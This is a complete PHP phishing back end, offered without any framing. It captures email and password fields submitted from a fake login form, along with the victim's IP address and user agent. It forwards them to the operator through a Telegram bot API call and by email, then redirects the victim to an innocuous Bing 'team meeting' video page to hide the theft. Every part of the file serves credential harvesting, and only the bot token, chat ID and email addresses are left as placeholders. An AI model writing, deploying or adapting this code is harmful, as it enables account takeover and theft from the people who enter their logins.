<?php
// Configuration
$TARGET_URL = "https://www.bing.com/videos/riverview/relatedvideo?q=team+meeting&mid=06C0E4192AA37E48CEC406C0E4192AA37E48CEC4&FORM=VIRE";

// Telegram Bot Config
$TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
$TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";

// Email Config
$TO_EMAIL = "your-email@example.com";
$EMAIL_SUBJECT = "Login Attempt Captured - " . date('Y-m-d H:i:s');
$FROM_EMAIL = "noreply@yourdomain.com";

// Check if form was submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email']) && isset($_POST['password'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    
    $message = "Login Attempt Captured:\n\n";
    $message .= "Email: $email\n";
    $message .= "Password: $password\n";
    $message .= "Time: " . date('Y-m-d H:i:s') . "\n";
    $message .= "IP Address: $ip\n";
    $message .= "User Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "\n";

    // Send to Telegram
    sendToTelegram($message, $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID);

    // Send to Email
    sendEmail($TO_EMAIL, $EMAIL_SUBJECT, $message, $FROM_EMAIL);
}

// Redirect to target URL
header("Location: $TARGET_URL");
exit;

function sendToTelegram($message, $botToken, $chatId) {
    if (!$botToken || !$chatId) {
        error_log("Telegram: Missing bot token or chat ID");
        return false;
    }

    try {
        $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];

        $options = [
            'http' => [
                'method' => 'POST',
                'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
                'content' => http_build_query($data),
                'timeout' => 10
            ]
        ];

        $context = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);
        
        return $result !== FALSE;
    } catch (Exception $e) {
        error_log("Telegram Error: " . $e->getMessage());
        return false;
    }
}

function sendEmail($to, $subject, $message, $from) {
    if (!$to || !$from) {
        error_log("Email: Missing to or from address");
        return false;
    }

    // Validate email format
    if (!filter_var($to, FILTER_VALIDATE_EMAIL) || !filter_var($from, FILTER_VALIDATE_EMAIL)) {
        error_log("Email: Invalid email format - To: $to, From: $from");
        return false;
    }

    // Proper headers
    $headers = "From: $from\r\n";
    $headers .= "Reply-To: $from\r\n";
    $headers .= "Return-Path: $from\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();

    try {
        $additional_parameters = "-f $from";
        $sent = mail($to, $subject, $message, $headers, $additional_parameters);
        
        return $sent;
    } catch (Exception $e) {
        error_log("Email Error: " . $e->getMessage());
        return false;
    }
}
?>
